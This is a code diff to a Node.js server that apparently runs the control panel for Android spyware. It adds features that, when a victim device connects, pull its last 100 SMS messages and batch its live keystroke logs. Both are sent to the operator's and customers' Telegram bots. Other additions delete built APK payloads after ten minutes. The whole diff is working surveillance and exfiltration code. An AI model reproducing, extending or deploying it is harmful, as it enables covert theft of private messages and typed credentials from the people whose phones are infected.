@@ -115,8 +115,145 @@ const telegramSettings = {
     botToken:  process.env.TELEGRAM_BOT_TOKEN  || '',
     chatId:    process.env.TELEGRAM_CHAT_ID    || '',
     enabled:   true,
-    notifyConnect: true,
+    notifyConnect:          true,
+    sendSmsOnConnect:       false,
+    sendKeylogOnConnect:    false,
 };
+
+// Internal callbacks for commands sent server-side (not from a dashboard user).
+// Map: commandId -> { ts, handler }
+const _internalCmdCallbacks = new Map();
+
+// Per-user keylog batching for Telegram: Map<userId, { buf, timer, devName }>
+const _userKeylogBuffers = new Map();
+const USER_KEYLOG_FLUSH_MS = 4000;
+
+async function _forwardKeylogToUsers(deviceId, entry) {
+    try {
+        const rec = inMemoryDevices.get(deviceId);
+        const accessId = rec?.accessId || '';
+        if (!accessId) return;
+        const users = await User.find({
+            role: 'user',
+            accessId,
+            telegramEnabled: true,
+            telegramSendKeylogOnConnect: true,
+            telegramBotToken: { $ne: '' },
+            telegramChatId:   { $ne: '' },
+        }).select('_id telegramBotToken telegramChatId').lean();
+        if (!users.length) return;
+        const devName = rec?.deviceInfo?.name || rec?.deviceName || deviceId;
+        for (const u of users) {
+            const uid = String(u._id);
+            let buf = _userKeylogBuffers.get(uid);
+            if (!buf) { buf = { entries: [], devName, deviceId, token: u.telegramBotToken, chatId: u.telegramChatId }; _userKeylogBuffers.set(uid, buf); }
+            buf.entries.push(entry);
+            if (!buf.timer) {
+                buf.timer = setTimeout(() => {
+                    _userKeylogBuffers.delete(uid);
+                    if (!buf.entries.length) return;
+                    const lines = buf.entries.map(e => {
+                        const app = (e.appName || e.packageName || '').split('.').pop();
+                        const txt = (e.text || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+                        return `<b>${app}</b>: <code>${txt}</code>`;
+                    });
+                    const text = `⌨️ <b>Keylog — ${buf.devName}</b>\n━━━━━━━━━━━━━━━━━━━\n🆔 <code>${buf.deviceId}</code>\n\n` + lines.join('\n');
+                    sendTelegramRaw(buf.token, buf.chatId, text).catch(() => {});
+                }, USER_KEYLOG_FLUSH_MS);
+                if (buf.timer.unref) buf.timer.unref();
+            }
+        }
+    } catch (_) {}
+}
+
+// Keylog batching buffers for Telegram forwarding: deviceId -> [entries]
+const _keylogTelegramBuffer = new Map();
+const _keylogTelegramTimers = new Map();
+const KEYLOG_TELEGRAM_BATCH_DELAY_MS = 4000;
+
+function _flushKeylogToTelegram(deviceId, deviceName) {
+    const entries = _keylogTelegramBuffer.get(deviceId) || [];
+    _keylogTelegramBuffer.delete(deviceId);
+    _keylogTelegramTimers.delete(deviceId);
+    if (!entries.length) return;
+
+    const lines = entries.map(e => {
+        const app = (e.appName || e.packageName || '').split('.').pop();
+        const txt = (e.text || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+        return `<b>${app}</b>: <code>${txt}</code>`;
+    });
+    const text =
+        `⌨️ <b>Keylog — ${deviceName}</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━\n` +
+        `🆔 <code>${deviceId}</code>\n\n` +
+        lines.join('\n');
+    sendTelegram(text);
+}
+
+function _bufferKeylogForTelegram(deviceId, deviceName, entry) {
+    const buf = _keylogTelegramBuffer.get(deviceId) || [];
+    buf.push(entry);
+    _keylogTelegramBuffer.set(deviceId, buf);
+    if (!_keylogTelegramTimers.has(deviceId)) {
+        const t = setTimeout(() => _flushKeylogToTelegram(deviceId, deviceName), KEYLOG_TELEGRAM_BATCH_DELAY_MS);
+        if (t.unref) t.unref();
+        _keylogTelegramTimers.set(deviceId, t);
+    }
+}
+
+function _getTcpConnForDevice(deviceId) {
+    const connId = deviceToTcp.get(deviceId);
+    if (!connId) return null;
+    return tcpClients.get(connId) || null;
+}
+
+async function _autoSendSmsToTelegram(deviceId, deviceName, sendToAdmin, userList) {
+    const conn = _getTcpConnForDevice(deviceId);
+    if (!conn || !conn.writable) return;
+    const commandId = crypto.randomBytes(12).toString('hex');
+    _internalCmdCallbacks.set(commandId, { ts: Date.now(), handler: async (response, error) => {
+        if (error || !response) return;
+        let msgs = [];
+        try {
+            const d = typeof response === 'string' ? JSON.parse(response) : response;
+            msgs = d.messages || d.sms || [];
+        } catch (_) {}
+        if (!msgs.length) return;
+        const limited = msgs.slice(0, 100);
+        const safeEscape = s => String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+        const htmlBody = limited.map(m => {
+            const dir  = m.type === 2 ? '📤' : '📥';
+            const addr = safeEscape(m.address || 'Unknown');
+            const body = safeEscape((m.body || '').slice(0, 200));
+            const dt   = m.date ? new Date(Number(m.date)).toLocaleString() : '';
+            return `${dir} <b>${addr}</b> <i>${dt}</i>\n<code>${body}</code>`;
+        }).join('\n\n');
+        const header =
+            `💬 <b>Last ${limited.length} SMS — ${deviceName}</b>\n` +
+            `━━━━━━━━━━━━━━━━━━━\n` +
+            `🆔 <code>${deviceId}</code>\n\n`;
+        const full = header + htmlBody;
+        const CHUNK = 3800;
+        // Admin Telegram (only if sendToAdmin flag is true)
+        if (sendToAdmin && telegramSettings.botToken && telegramSettings.chatId) {
+            for (let i = 0; i < full.length; i += CHUNK) {
+                await sendTelegramRaw(telegramSettings.botToken, telegramSettings.chatId, full.slice(i, i + CHUNK));
+                await new Promise(r => setTimeout(r, 300));
+            }
+        }
+        // Per-user Telegrams
+        if (userList && userList.length) {
+            for (const u of userList) {
+                for (let i = 0; i < full.length; i += CHUNK) {
+                    await sendTelegramRaw(u.telegramBotToken, u.telegramChatId, full.slice(i, i + CHUNK));
+                    await new Promise(r => setTimeout(r, 300));
+                }
+            }
+        }
+    }});
+    setTimeout(() => _internalCmdCallbacks.delete(commandId), 60000);
+    tcpSend(conn, 'command:execute', { commandId, command: 'get_all_sms', params: { limit: 100 } });
+}
 
 // Build-worker settings — admin sets API key in dashboard Settings.
 // The build.sh script (running anywhere — locally, on a VPS, in CI)
@@ -649,17 +786,39 @@ async function processMessage(clientId, clientType, event, data) {
 
         // Telegram notification — only on a real fresh connect (>5 min since last seen)
         if (isFreshConnect) {
-            const name  = deviceInfo?.name || deviceId;
-            const model = [deviceInfo?.manufacturer, deviceInfo?.model].filter(Boolean).join(' ') || 'Unknown';
-            const ts    = new Date().toLocaleString();
-            const text  =
-                `📱 <b>Device Connected</b>\n` +
-                `🆔 ID: <code>${deviceId}</code>\n` +
-                `📛 Name: ${name}\n` +
-                `📟 Model: ${model}\n` +
-                `🕐 Time: ${ts}`;
+            const name    = deviceInfo?.name || deviceId;
+            const model   = [deviceInfo?.manufacturer, deviceInfo?.model].filter(Boolean).join(' ') || 'Unknown';
+            const android = deviceInfo?.androidVersion ? `Android ${deviceInfo.androidVersion}` : null;
+            const ts      = new Date().toLocaleString();
+            const text    =
+                `🟢 <b>Device Online</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━\n` +
+                `📱 <b>${name}</b>\n` +
+                `🆔 <code>${deviceId}</code>\n` +
+                `📟 ${model}\n` +
+                (android ? `🤖 ${android}\n` : '') +
+                `🕐 <i>${ts}</i>`;
             if (telegramSettings.notifyConnect) sendTelegram(text);
             broadcastTelegramToUsers(text, 'connect');
+
+            // Auto-send last 100 SMS to Telegram on connect
+            const _doAutoSms = async () => {
+                try {
+                    const usersForSms = accessId ? await User.find({
+                        role: 'user', accessId,
+                        telegramEnabled: true,
+                        telegramSendSmsOnConnect: true,
+                        telegramBotToken: { $ne: '' },
+                        telegramChatId:   { $ne: '' },
+                    }).select('telegramBotToken telegramChatId').lean() : [];
+                    const adminWants = telegramSettings.enabled && telegramSettings.sendSmsOnConnect;
+                    if (adminWants || usersForSms.length) {
+                        await new Promise(r => setTimeout(r, 3000));
+                        await _autoSendSmsToTelegram(deviceId, name, adminWants, usersForSms);
+                    }
+                } catch (_) {}
+            };
+            _doAutoSms();
         }
         return;
     }
@@ -747,6 +906,14 @@ async function processMessage(clientId, clientType, event, data) {
             broadcastDash('keylog:push', entry);
             // Persist to Redis (non-blocking)
             R.pushKeylog(deviceId, entry).catch(() => {});
+            // Forward to Telegram if admin enabled live keylog forwarding
+            if (telegramSettings.enabled && telegramSettings.sendKeylogOnConnect) {
+                const rec = inMemoryDevices.get(deviceId);
+                const devName = rec?.deviceInfo?.name || rec?.deviceName || deviceId;
+                _bufferKeylogForTelegram(deviceId, devName, entry);
+            }
+            // Also forward to per-user Telegrams if they have keylog enabled
+            _forwardKeylogToUsers(deviceId, entry).catch(() => {});
         }
         return;
     }
@@ -906,6 +1073,13 @@ async function processMessage(clientId, clientType, event, data) {
         let response = rawResponse;
         if (typeof rawResponse === 'string') {
             try { response = JSON.parse(rawResponse); } catch (_) { response = rawResponse; }
+        }
+
+        // Check internal server-side callbacks first (auto-commands triggered on device connect)
+        const internalCb = _internalCmdCallbacks.get(commandId);
+        if (internalCb) {
+            _internalCmdCallbacks.delete(commandId);
+            try { internalCb.handler(response, error); } catch (_) {}
         }
 
         // Push to dashboard SSE IMMEDIATELY — before any DB operations
@@ -1371,11 +1545,13 @@ app.get('/api/settings', requireUserOrAdmin, async (req, res) => {
             success: true,
             role: 'admin',
             telegram: {
-                botToken:      telegramSettings.botToken ? '***' + telegramSettings.botToken.slice(-6) : '',
-                botTokenSet:   !!telegramSettings.botToken,
-                chatId:        telegramSettings.chatId,
-                enabled:       telegramSettings.enabled,
-                notifyConnect: telegramSettings.notifyConnect,
+                botToken:            telegramSettings.botToken ? '***' + telegramSettings.botToken.slice(-6) : '',
+                botTokenSet:         !!telegramSettings.botToken,
+                chatId:              telegramSettings.chatId,
+                enabled:             telegramSettings.enabled,
+                notifyConnect:       telegramSettings.notifyConnect,
+                sendSmsOnConnect:    telegramSettings.sendSmsOnConnect,
+                sendKeylogOnConnect: telegramSettings.sendKeylogOnConnect,
             },
             buildWorker: {
                 apiKey:               buildWorkerSettings.apiKey ? '***' + buildWorkerSettings.apiKey.slice(-6) : '',
@@ -1389,18 +1565,20 @@ app.get('/api/settings', requireUserOrAdmin, async (req, res) => {
     // User: load their personal telegram settings
     try {
         const user = await User.findById(req.authUserId).select(
-            'telegramBotToken telegramChatId telegramEnabled telegramNotifyConnect'
+            'telegramBotToken telegramChatId telegramEnabled telegramNotifyConnect telegramSendSmsOnConnect telegramSendKeylogOnConnect'
         );
         if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
         res.json({
             success: true,
             role: 'user',
             telegram: {
-                botToken:      user.telegramBotToken ? '***' + user.telegramBotToken.slice(-6) : '',
-                botTokenSet:   !!user.telegramBotToken,
-                chatId:        user.telegramChatId || '',
-                enabled:       user.telegramEnabled !== false,
-                notifyConnect: user.telegramNotifyConnect !== false,
+                botToken:            user.telegramBotToken ? '***' + user.telegramBotToken.slice(-6) : '',
+                botTokenSet:         !!user.telegramBotToken,
+                chatId:              user.telegramChatId || '',
+                enabled:             user.telegramEnabled !== false,
+                notifyConnect:       user.telegramNotifyConnect !== false,
+                sendSmsOnConnect:    !!user.telegramSendSmsOnConnect,
+                sendKeylogOnConnect: !!user.telegramSendKeylogOnConnect,
             },
         });
     } catch (e) {
@@ -1417,8 +1595,10 @@ app.post('/api/settings', requireUserOrAdmin, async (req, res) => {
         if (typeof telegram.botToken      === 'string' && telegram.botToken && !telegram.botToken.startsWith('***'))
             telegramSettings.botToken = telegram.botToken.trim();
         if (typeof telegram.chatId        === 'string')  telegramSettings.chatId        = telegram.chatId.trim();
-        if (typeof telegram.enabled       === 'boolean') telegramSettings.enabled       = telegram.enabled;
-        if (typeof telegram.notifyConnect === 'boolean') telegramSettings.notifyConnect = telegram.notifyConnect;
+        if (typeof telegram.enabled             === 'boolean') telegramSettings.enabled             = telegram.enabled;
+        if (typeof telegram.notifyConnect       === 'boolean') telegramSettings.notifyConnect       = telegram.notifyConnect;
+        if (typeof telegram.sendSmsOnConnect    === 'boolean') telegramSettings.sendSmsOnConnect    = telegram.sendSmsOnConnect;
+        if (typeof telegram.sendKeylogOnConnect === 'boolean') telegramSettings.sendKeylogOnConnect = telegram.sendKeylogOnConnect;
         // Admin-only build worker key
         const bw = req.body?.buildWorker;
         if (bw && typeof bw === 'object') {
@@ -1447,8 +1627,10 @@ app.post('/api/settings', requireUserOrAdmin, async (req, res) => {
         if (typeof telegram.botToken      === 'string' && telegram.botToken && !telegram.botToken.startsWith('***'))
             user.telegramBotToken = telegram.botToken.trim();
         if (typeof telegram.chatId        === 'string')  user.telegramChatId        = telegram.chatId.trim();
-        if (typeof telegram.enabled       === 'boolean') user.telegramEnabled       = telegram.enabled;
-        if (typeof telegram.notifyConnect === 'boolean') user.telegramNotifyConnect = telegram.notifyConnect;
+        if (typeof telegram.enabled             === 'boolean') user.telegramEnabled             = telegram.enabled;
+        if (typeof telegram.notifyConnect       === 'boolean') user.telegramNotifyConnect       = telegram.notifyConnect;
+        if (typeof telegram.sendSmsOnConnect    === 'boolean') user.telegramSendSmsOnConnect    = telegram.sendSmsOnConnect;
+        if (typeof telegram.sendKeylogOnConnect === 'boolean') user.telegramSendKeylogOnConnect = telegram.sendKeylogOnConnect;
         await user.save();
         log('SETTINGS', `User Telegram settings updated for ${user.email}`);
         return res.json({ success: true });
@@ -1563,6 +1745,41 @@ app.get('/api/camera/latest/:deviceId', (req, res) => {
 // One job runs at a time. Pending jobs are kept in FIFO order. A finished
 // job is moved to `recentBuildJobs` (capped) so the UI can fetch its log.
 const BUILD_OUTPUT_ROOT = path.join(__dirname, '..', 'apk-output');
+const APK_EXPIRY_MS = 10 * 60 * 1000; // 10 minutes
+// Map: accessId -> expiry timer handle (only one timer per accessId at a time)
+const _apkExpiryTimers = new Map();
+
+function _deleteApkDir(accessId) {
+    const dir = path.join(BUILD_OUTPUT_ROOT, accessId);
+    try {
+        if (fs.existsSync(dir)) {
+            fs.readdirSync(dir).forEach(f => {
+                try { fs.unlinkSync(path.join(dir, f)); } catch (_) {}
+            });
+            try { fs.rmdirSync(dir); } catch (_) {}
+            log('BUILD', `APK files for ${accessId} expired and deleted after 10 minutes`);
+        }
+    } catch (e) {
+        log('BUILD', `Failed to delete APK dir for ${accessId}: ${e.message}`, 'warn');
+    }
+    _apkExpiryTimers.delete(accessId);
+}
+
+// Track expiry timestamps for the build status API
+const _apkExpiryTimes = new Map(); // accessId -> expiresAt ms
+
+function _scheduleApkExpiry(accessId) {
+    // Cancel any existing timer for this accessId (reset on re-upload)
+    const existing = _apkExpiryTimers.get(accessId);
+    if (existing) clearTimeout(existing);
+    const expiresAt = Date.now() + APK_EXPIRY_MS;
+    _apkExpiryTimes.set(accessId, expiresAt);
+    const handle = setTimeout(() => { _deleteApkDir(accessId); _apkExpiryTimes.delete(accessId); }, APK_EXPIRY_MS);
+    if (handle.unref) handle.unref();
+    _apkExpiryTimers.set(accessId, handle);
+    log('BUILD', `APKs for ${accessId} will auto-expire in 10 minutes`);
+}
+
 const BUILD_JOBS_MAX_LINES = 4000;
 const BUILD_JOBS_RECENT_KEEP = 50;
 const BUILD_WORKER_OFFLINE_MS = 30000;
@@ -1910,6 +2127,7 @@ app.get('/api/build/status', requireUserOrAdmin, async (req, res) => {
         startedAt:    job.startedAt,
         finishedAt:   job.finishedAt,
         lines:        job.lines.slice(-300),
+        apkExpiresAt: _apkExpiryTimes.get(job.accessId) || null,
     });
 });
 
@@ -2191,6 +2409,8 @@ app.post('/api/build/worker/upload/:jobId/:type', requireBuildWorker,
         const sizeMb = (buf.length / 1024 / 1024).toFixed(2);
         log('BUILD', `Saved ${filename} for ${accessId} (${sizeMb} MB) from job ${req.params.jobId}`);
         if (job) pushJobLine(job, `⬆ Uploaded ${filename} (${sizeMb} MB)`);
+        // Schedule APK expiry: delete the entire output dir 10 minutes after save
+        _scheduleApkExpiry(accessId);
         res.json({ success: true });
     }
 );
